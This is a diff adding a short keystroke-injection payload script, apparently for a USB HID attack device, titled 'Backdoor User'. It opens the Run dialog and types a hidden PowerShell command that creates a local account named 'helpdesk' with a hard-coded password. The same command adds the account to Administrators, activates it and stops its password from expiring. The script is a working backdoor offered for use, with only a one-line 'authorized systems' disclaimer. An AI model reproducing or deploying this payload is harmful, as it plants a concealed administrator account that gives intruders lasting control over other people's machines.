@@ -1,0 +1,11 @@
+META windows acceso
+REM Title: Backdoor User
+REM Description: Creates a hidden local admin user
+REM Change USERNAME and PASSWORD before using
+REM Use only on authorized systems
+
+DEFAULTDELAY 400
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "net user helpdesk e9!4!u%%a%H46% /add; net localgroup Administrators helpdesk /add; net user helpdesk /active:yes; wmic useraccount where name='helpdesk' set PasswordExpires=False"
+ENTER
